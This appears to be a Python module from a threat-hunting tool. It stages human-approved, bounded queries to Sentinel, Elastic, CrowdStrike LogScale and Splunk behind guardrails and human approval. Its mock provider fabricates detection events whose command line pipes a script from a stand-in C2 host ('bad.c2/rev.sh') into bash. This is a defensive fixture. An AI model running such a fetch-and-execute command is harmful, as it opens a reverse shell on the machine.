"""Bounded query proposal + execution -- the "propose, don't run" bridge.

Mirrors the CTIProvider/HecateClient pattern already used for CTI intake and
hypothesis generation: a small typed interface plus pluggable backends.

Deliberately narrow in scope: no LLM drafts or approves a query here. A
human proposes a query for a specific hunt; deterministic guardrails reject
anything unbounded before it's ever staged; a human explicitly approves
execution via its own command. Auto-drafting queries is a separate, higher-
stakes capability this module does not attempt.
"""

from __future__ import annotations

import json
import logging
import os
import subprocess
from abc import ABC, abstractmethod
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import quote, urlsplit
from uuid import UUID

import httpx

from hecate_runner.subprocess_utils import run_process_group

log = logging.getLogger(__name__)


@dataclass
class ProposedQuery:
    """A query staged for human approval before it touches a real data source."""

    hunt_id: str
    data_source: str
    query_text: str
    time_range_days: int
    limit: int
    justification: str = ""
    proposed_at: str = field(default_factory=lambda: datetime.now(UTC).isoformat())

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> ProposedQuery:
        known = {f for f in cls.__dataclass_fields__}
        return cls(**{k: v for k, v in data.items() if k in known})


@dataclass
class QueryResult:
    """Outcome of actually executing a (guardrail-passed) proposed query."""

    outcome: str  # "executed" | "error"
    provider: str
    row_count: int = 0
    detail: str = ""
    executed_at: str = field(default_factory=lambda: datetime.now(UTC).isoformat())
    events: list[dict[str, Any]] = field(default_factory=list)

    @property
    def ok(self) -> bool:
        return self.outcome == "executed"


def validate_guardrails(
    query: ProposedQuery,
    *,
    max_time_range_days: int = 7,
    max_limit: int = 1000,
) -> list[str]:
    """Return guardrail violations for a proposed query. Empty list == passes.

    Mirrors AGENTS.md's "Query Guardrails" section: bounded time range,
    bounded result count, non-empty query and data source. Deterministic and
    LLM-independent by design -- these are hard limits an operator sets, not
    suggestions a model (or a human in a hurry) can talk their way around.
    """
    violations: list[str] = []

    if not isinstance(query.query_text, str) or not query.query_text.strip():
        violations.append("query_text is empty")

    if type(query.time_range_days) is not int:
        violations.append("time_range_days must be an integer")
    elif query.time_range_days <= 0:
        violations.append("time_range_days must be positive")
    elif query.time_range_days > max_time_range_days:
        violations.append(
            f"time_range_days={query.time_range_days} exceeds max_time_range_days="
            f"{max_time_range_days} (exploratory queries are capped at 7 days by default)"
        )

    if type(query.limit) is not int:
        violations.append("limit must be an integer")
    elif query.limit <= 0:
        violations.append("limit must be positive")
    elif query.limit > max_limit:
        violations.append(f"limit={query.limit} exceeds max_limit={max_limit}")

    if not isinstance(query.data_source, str) or not query.data_source.strip():
        violations.append("data_source is required")

    return violations


class QueryProvider(ABC):
    """Executes a guardrail-passed query against a real or fake backend."""

    name: str

    def configuration_errors(self) -> list[str]:
        return []

    @abstractmethod
    def execute(self, query: ProposedQuery) -> QueryResult: ...


class MockQueryProvider(QueryProvider):
    """Never touches a real system.

    Stands in until a live data source exists. Every result is clearly
    labeled as a mock so it can't be mistaken for a real query outcome.
    Supports configurable simulated responses across sequential executions.
    """

    name = "mock"

    def __init__(self, responses: list[int] | None = None, default_row_count: int = 0):
        self.responses = list(responses) if responses is not None else None
        self.default_row_count = default_row_count
        self.call_count = 0
        self.executed_queries: list[ProposedQuery] = []

    def execute(self, query: ProposedQuery) -> QueryResult:
        self.executed_queries.append(query)
        log.info("[mock] Would execute on %s: %s", query.data_source, query.query_text)
        if self.responses is not None and len(self.responses) > 0:
            idx = min(self.call_count, len(self.responses) - 1)
            count = self.responses[idx]
        else:
            env_val = os.getenv("HECATE_MOCK_QUERY_ROWS")
            count = (
                int(env_val)
                if env_val is not None and env_val.isdigit()
                else self.default_row_count
            )
        self.call_count += 1
        events = [
            {
                "event_id": f"mock-evt-{i+1}",
                "timestamp": datetime.now(UTC).isoformat(),
                "hunt_id": query.hunt_id,
                "data_source": query.data_source,
                "host": f"iot-edge-0{i+1}",
                "user": "nodered",
                "parent_image": "/usr/local/bin/node-red",
                "image": "/bin/sh",
                "command_line": "/bin/sh -c 'curl -fsSL http://bad.c2/rev.sh | bash'",
                "summary": f"Simulated detection telemetry event {i+1} for {query.hunt_id}",
            }
            for i in range(min(count, 10))
        ]
        return QueryResult(
            outcome="executed",
            provider=self.name,
            row_count=count,
            detail=(
                f"Mock provider found {count} simulated event(s) for {query.data_source}. "
                "No live SIEM queried."
            ),
            events=events,
        )


class _QueryError(ValueError):
    """A query/configuration error whose message is safe to display."""


def _base_url(value: str) -> str:
    parts = urlsplit(value)
    _ = parts.port  # Validate the optional port before any HTTP request.
    if (
        parts.scheme not in {"https", "http"}
        or not parts.netloc
        or parts.username
        or parts.password
        or parts.query
        or parts.fragment
        or "?" in value
        or "#" in value
    ):
        raise _QueryError(
            "Configure an HTTP(S) endpoint without embedded credentials, query, or fragment"
        )
    return value.rstrip("/")


def _bounded_kql(text: str, limit: int) -> str:
    """Wrap one tabular result in a function, preserving local let statements.

    Validate delimiters and literals so the body cannot escape the wrapper or
    swallow the appended limit. Kusto validates the remaining language syntax.
    """
    stack: list[str] = []
    i = 0
    while i < len(text):
        if text.startswith("//", i):
            end = text.find("\n", i)
            i = len(text) if end < 0 else end + 1
            continue
        if text.startswith("/*", i):
            end = text.find("*/", i + 2)
            if end < 0:
                raise _QueryError("KQL contains an unterminated comment")
            i = end + 2
            continue
        if text.startswith("```", i):
            end = text.find("```", i + 3)
            if end < 0:
                raise _QueryError("KQL contains an unterminated multiline string")
            i = end + 3
            continue
        verbatim = text[i] == "@" and i + 1 < len(text) and text[i + 1] in "\"'"
        if verbatim:
            i += 1
        ch = text[i]
        if ch in "\"'":
            delimiter = ch
            i += 1
            while i < len(text):
                if text[i] == delimiter:
                    if i + 1 < len(text) and text[i + 1] == delimiter:
                        i += 2
                        continue
                    i += 1
                    break
                if not verbatim and text[i] == "\\":
                    i += 2
                else:
                    i += 1
            else:
                raise _QueryError("KQL contains an unterminated string")
            continue
        if ch in "({[":
            stack.append(ch)
        elif ch in ")}]" and (not stack or stack.pop() != {")": "(", "}": "{", "]": "["}[ch]):
            raise _QueryError("KQL contains unbalanced delimiters")
        i += 1
    if stack:
        raise _QueryError("KQL contains unbalanced delimiters")
    body = text.strip().rstrip(";")
    return (
        f"let __hecate_bounded_query = () {{\n{body}\n}};\n__hecate_bounded_query()\n| take {limit}"
    )


class _HTTPQueryProvider(QueryProvider):
    """Shared configuration, guardrails, and failure handling for live adapters."""

    required: tuple[tuple[str, ...], ...] = ()

    def __init__(
        self,
        workspace: Path | None = None,
        timeout_sec: int = 60,
        *,
        max_time_range_days: int = 7,
        max_limit: int = 1000,
        env_overrides: dict[str, str] | None = None,
    ):
        self.workspace = workspace
        self.timeout_sec = timeout_sec
        self.max_time_range_days = max_time_range_days
        self.max_limit = max_limit
        self.env_overrides = env_overrides or {}

    def _environment(self) -> dict[str, str]:
        from dotenv import dotenv_values

        values = dotenv_values(self.workspace / ".env", interpolate=False) if self.workspace else {}
        env: dict[str, str] = {}
        for layer in (
            {k: v for k, v in values.items() if v is not None},
            dict(os.environ),
            self.env_overrides,
        ):
            env.update(layer)
            # An explicit legacy alias also overrides a workspace's canonical key.
            # Explicit blanks disable a credential instead of reviving old values.
            for keys in self.required:
                for key in keys:
                    if key in layer:
                        value = layer[key]
                        for alias in keys:
                            env.pop(alias, None)
                        env[keys[0]] = value
                        break
        return env

    def configuration_errors(self) -> list[str]:
        env = self._environment()
        errors = [
            "Missing " + " or ".join(keys)
            for keys in self.required
            if not any(env.get(k) for k in keys)
        ]
        if errors:
            return errors
        try:
            self._validate_config(env)
        except (_QueryError, ValueError):
            return ["Invalid endpoint, workspace identifier, or repository/index configuration"]
        return []

    def _validate_config(self, env: dict[str, str]) -> None:
        pass

    @abstractmethod
    def _request(
        self, query: ProposedQuery, env: dict[str, str]
    ) -> tuple[str, dict[str, Any], dict[str, str], dict[str, str]]: ...

    @abstractmethod
    def _parse(self, data: Any) -> tuple[list[Any], str]: ...

    def _cleanup_pending(self, client: httpx.Client, env: dict[str, str], data: Any) -> None:
        pass

    def execute(self, query: ProposedQuery) -> QueryResult:
        try:
            violations = validate_guardrails(
                query, max_time_range_days=self.max_time_range_days, max_limit=self.max_limit
            )
            if violations:
                raise _QueryError("Guardrail violation: " + "; ".join(violations))
            errors = self.configuration_errors()
            if errors:
                raise _QueryError("; ".join(errors))
            env = self._environment()
            endpoint, body, headers, params = self._request(query, env)
            with httpx.Client(timeout=self.timeout_sec) as client:
                response = client.post(endpoint, json=body, headers=headers, params=params)
                response.raise_for_status()
                data = response.json()
                self._cleanup_pending(client, env, data)
                rows, kind = self._parse(data)
            if len(rows) > query.limit:
                raise _QueryError("Backend returned more matches than the approved result limit")
            preview = {
                "result_kind": kind,
                "row_count": len(rows),
                "rows": rows[:3],
                "preview_truncated": len(rows) > 3,
            }
            detail = json.dumps(preview)
            if len(detail) > 2000:
                detail = json.dumps(
                    {
                        "result_kind": kind,
                        "row_count": len(rows),
                        "preview": detail[:600],
                        "preview_truncated": True,
                    }
                )
            events = [r for r in rows if isinstance(r, dict)]
            return QueryResult(
                outcome="executed",
                provider=self.name,
                row_count=len(rows),
                detail=detail,
                events=events,
            )
        except _QueryError as exc:
            detail = str(exc)
        except httpx.HTTPStatusError as exc:
            detail = f"HTTP {exc.response.status_code}; check query syntax, endpoint, and access permissions"
        except httpx.TimeoutException:
            detail = f"Query timed out after {self.timeout_sec}s"
        except httpx.RequestError:
            detail = "Could not connect to the configured query endpoint"
        except Exception:
            detail = "Invalid query response or configuration"
        return QueryResult(outcome="error", provider=self.name, detail=detail)

    @staticmethod
    def _window(query: ProposedQuery) -> tuple[datetime, datetime]:
        end = datetime.now(UTC)
        return end - timedelta(days=query.time_range_days), end


class SentinelQueryProvider(_HTTPQueryProvider):
    """Execute a bounded tabular KQL result through Azure Monitor Logs."""

    name = "sentinel"
    required = (("SENTINEL_WORKSPACE_ID",), ("SENTINEL_BEARER_TOKEN", "AZURE_ACCESS_TOKEN"))

    def _validate_config(self, env: dict[str, str]) -> None:
        UUID(env["SENTINEL_WORKSPACE_ID"])

    def _request(
        self, query: ProposedQuery, env: dict[str, str]
    ) -> tuple[str, dict[str, Any], dict[str, str], dict[str, str]]:
        start, end = self._window(query)
        endpoint = f"https://api.loganalytics.azure.com/v1/workspaces/{quote(str(UUID(env['SENTINEL_WORKSPACE_ID'])), safe='')}/query"
        body = {
            "query": _bounded_kql(query.query_text, query.limit),
            "timespan": f"{start.isoformat()}/{end.isoformat()}",
        }
        headers = {
            "Authorization": f"Bearer {env.get('SENTINEL_BEARER_TOKEN') or env['AZURE_ACCESS_TOKEN']}",
            "Content-Type": "application/json",
            "Prefer": f"wait={self.timeout_sec}",
        }
        return endpoint, body, headers, {}

    def _parse(self, data: Any) -> tuple[list[Any], str]:
        if not isinstance(data, dict) or data.get("error") is not None:
            raise _QueryError("Sentinel returned an error or partial query results")
        tables = data.get("tables")
        if not isinstance(tables, list) or len(tables) != 1 or not isinstance(tables[0], dict):
            raise _QueryError("Sentinel did not return one tabular result")
        if tables[0].get("name") != "PrimaryResult":
            raise _QueryError("Sentinel did not return a PrimaryResult table")
        rows = tables[0].get("rows")
        if not isinstance(rows, list) or not all(isinstance(row, list) for row in rows):
            raise _QueryError("Sentinel returned malformed result rows")
        return rows, "rows"


class ElasticQueryProvider(_HTTPQueryProvider):
    """Execute bounded Elasticsearch EQL event or sequence matches."""

    name = "elastic"
    required = (("ELASTIC_URL",), ("ELASTIC_API_KEY",), ("ELASTIC_INDEX",))

    def _validate_config(self, env: dict[str, str]) -> None:
        import re

        _base_url(env["ELASTIC_URL"])
        if not re.fullmatch(r"[A-Za-z0-9_.:+*?,\-]+", env["ELASTIC_INDEX"]) or any(
            part in {"", ".", ".."} for part in env["ELASTIC_INDEX"].split(",")
        ):
            raise _QueryError("Invalid Elastic index pattern")
        if not env.get("ELASTIC_TIMESTAMP_FIELD", "@timestamp").strip():
            raise _QueryError("Elastic timestamp field must not be empty")

    def _request(
        self, query: ProposedQuery, env: dict[str, str]
    ) -> tuple[str, dict[str, Any], dict[str, str], dict[str, str]]:
        start, end = self._window(query)
        index = quote(env["ELASTIC_INDEX"], safe=",*:-_.")
        endpoint = f"{_base_url(env['ELASTIC_URL'])}/{index}/_eql/search"
        body = {
            "query": f"{query.query_text.strip()}\n| head {query.limit}",
            "size": query.limit,
            "timestamp_field": env.get("ELASTIC_TIMESTAMP_FIELD", "@timestamp"),
            "filter": {
                "range": {
                    env.get("ELASTIC_TIMESTAMP_FIELD", "@timestamp"): {
                        "gte": start.isoformat(),
                        "lt": end.isoformat(),
                    }
                }
            },
            "wait_for_completion_timeout": f"{max(1, self.timeout_sec - 5)}s",
            "keep_on_completion": False,
        }
        return (
            endpoint,
            body,
            {
                "Authorization": f"ApiKey {env['ELASTIC_API_KEY']}",
                "Content-Type": "application/json",
            },
            {"allow_partial_search_results": "false"},
        )

    def _cleanup_pending(self, client: httpx.Client, env: dict[str, str], data: Any) -> None:
        if (
            isinstance(data, dict)
            and data.get("id")
            and (data.get("is_running") or data.get("is_partial") or data.get("timed_out"))
        ):
            try:
                client.delete(
                    f"{_base_url(env['ELASTIC_URL'])}/_eql/search/{quote(str(data['id']), safe='')}",
                    headers={"Authorization": f"ApiKey {env['ELASTIC_API_KEY']}"},
                )
            except httpx.HTTPError:
                log.warning("Could not cancel pending Elastic query")

    def _parse(self, data: Any) -> tuple[list[Any], str]:
        if (
            not isinstance(data, dict)
            or data.get("error") is not None
            or any(
                data.get(flag)
                for flag in ("is_running", "is_partial", "timed_out", "shard_failures")
            )
        ):
            raise _QueryError("Elastic returned failed, incomplete, or timed-out results")
        hits = data.get("hits")
        if not isinstance(hits, dict):
            raise _QueryError("Elastic returned no hits object")
        if "sequences" in hits and "events" in hits:
            raise _QueryError("Elastic returned ambiguous event and sequence matches")
        kind = "sequences" if "sequences" in hits else "events"
        rows = hits.get(kind)
        if not isinstance(rows, list) or not all(isinstance(row, dict) for row in rows):
            raise _QueryError("Elastic returned malformed matches")
        if kind == "sequences" and not all(isinstance(row.get("events"), list) for row in rows):
            raise _QueryError("Elastic returned malformed sequences")
        return rows, kind


class CrowdStrikeQueryProvider(_HTTPQueryProvider):
    """Execute a finite, bounded LogScale CQL query against a repository or view."""

    name = "crowdstrike"
    required = (
        ("FALCON_LOGSCALE_URL", "FALCON_BASE_URL"),
        ("FALCON_LOGSCALE_REPO",),
        ("FALCON_LOGSCALE_TOKEN", "FALCON_API_TOKEN", "FALCON_BEARER_TOKEN"),
    )

    def _validate_config(self, env: dict[str, str]) -> None:
        _base_url(env.get("FALCON_LOGSCALE_URL") or env["FALCON_BASE_URL"])
        if env["FALCON_LOGSCALE_REPO"] in {".", ".."} or "/" in env["FALCON_LOGSCALE_REPO"]:
            raise _QueryError("Invalid LogScale repository name")

    def _request(
        self, query: ProposedQuery, env: dict[str, str]
    ) -> tuple[str, dict[str, Any], dict[str, str], dict[str, str]]:
        start, end = self._window(query)
        url = _base_url(env.get("FALCON_LOGSCALE_URL") or env["FALCON_BASE_URL"])
        endpoint = f"{url}/api/v1/repositories/{quote(env['FALCON_LOGSCALE_REPO'], safe='')}/query"
        body = {
            "queryString": f"{query.query_text.strip()}\n| head(limit={query.limit})",
            "start": int(start.timestamp() * 1000),
            "end": int(end.timestamp() * 1000),
            "isLive": False,
            "allowEventSkipping": True,
        }
        token = (
            env.get("FALCON_LOGSCALE_TOKEN")
            or env.get("FALCON_API_TOKEN")
            or env["FALCON_BEARER_TOKEN"]
        )
        return (
            endpoint,
            body,
            {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            {},
        )

    def _parse(self, data: Any) -> tuple[list[Any], str]:
        if not isinstance(data, list) or not all(isinstance(row, dict) for row in data):
            raise _QueryError("LogScale did not return a JSON event array")
        return data, "events"


class SplunkQueryProvider(QueryProvider):
    """Shells out to `hecate-agent splunk search`, same subprocess pattern as HecateClient.

    Unvalidated against a real Splunk instance as of this writing -- there is
    no live Splunk access in this environment yet. The guardrail enforcement
    and propose/approve flow around this class are what's actually tested;
    this exists so wiring in real access later is a config change
    (HECATE_RUNNER_QUERY_PROVIDER=splunk), not new code.
    """

    name = "splunk"

    def __init__(self, hecate_bin: Path, workspace: Path, timeout_sec: int = 300):
        self.hecate_bin = hecate_bin
        self.workspace = workspace
        self.timeout_sec = timeout_sec

    def execute(self, query: ProposedQuery) -> QueryResult:
        query_text = query.query_text.strip()
        if not query_text.startswith("|") and not query_text.startswith("index="):
            clean_q = query_text.removeprefix("search ").strip()
            if "index=" not in clean_q:
                query_text = f"index=* | spath | search {clean_q}"

        cmd = [
            str(self.hecate_bin),
            "splunk",
            "search",
            query_text,
            "--earliest",
            f"-{query.time_range_days}d",
            "--latest",
            "now",
            "--count",
            str(query.limit),
            "--format",
            "json",
        ]
        try:
            result = run_process_group(
                cmd,
                cwd=str(self.workspace),
                text=True,
                timeout=self.timeout_sec,
                check=False,
            )
        except subprocess.TimeoutExpired:
            return QueryResult(
                outcome="error", provider=self.name, detail=f"timed out after {self.timeout_sec}s"
            )
        except FileNotFoundError:
            return QueryResult(
                outcome="error",
                provider=self.name,
                detail=f"hecate-agent binary missing at {self.hecate_bin}",
            )

        if result.returncode != 0:
            return QueryResult(
                outcome="error", provider=self.name, detail=result.stderr.strip()[:500]
            )

        # `hecate-agent splunk search --format json` prints a human-readable banner to
        # stdout before the JSON array, even in JSON mode -- find where the
        # array starts rather than assuming the whole stream is valid JSON.
        start = result.stdout.find("[")
        if start == -1:
            return QueryResult(
                outcome="error",
                provider=self.name,
                detail="no JSON array in hecate-agent splunk output",
            )

        try:
            data = json.loads(result.stdout[start:])
        except json.JSONDecodeError as exc:
            return QueryResult(
                outcome="error", provider=self.name, detail=f"could not parse results: {exc}"
            )

        events_list = data if isinstance(data, list) else []
        return QueryResult(
            outcome="executed",
            provider=self.name,
            row_count=len(events_list),
            detail=result.stdout[start : start + 2000],
            events=events_list,
        )


def get_provider(
    name: str,
    *,
    hecate_bin: Path | None = None,
    workspace: Path | None = None,
    responses: list[int] | None = None,
    max_time_range_days: int = 7,
    max_limit: int = 1000,
    env_overrides: dict[str, str] | None = None,
) -> QueryProvider:
    name_clean = name.strip().lower()
    options: dict[str, Any] = {
        "workspace": workspace,
        "max_time_range_days": max_time_range_days,
        "max_limit": max_limit,
        "env_overrides": env_overrides,
    }
    if name_clean == "mock":
        return MockQueryProvider(responses=responses)
    if name_clean == "splunk":
        if hecate_bin is None or workspace is None:
            raise ValueError("splunk provider requires hecate_bin and workspace")
        return SplunkQueryProvider(hecate_bin=hecate_bin, workspace=workspace)
    if name_clean in ("sentinel", "sentinel_kql"):
        return SentinelQueryProvider(**options)
    if name_clean in ("elastic", "elastic_eql"):
        return ElasticQueryProvider(**options)
    if name_clean in ("crowdstrike", "crowdstrike_cql"):
        return CrowdStrikeQueryProvider(**options)
    raise ValueError(
        f"Unknown query provider: {name!r}. Supported: mock, splunk, sentinel, elastic, crowdstrike"
    )
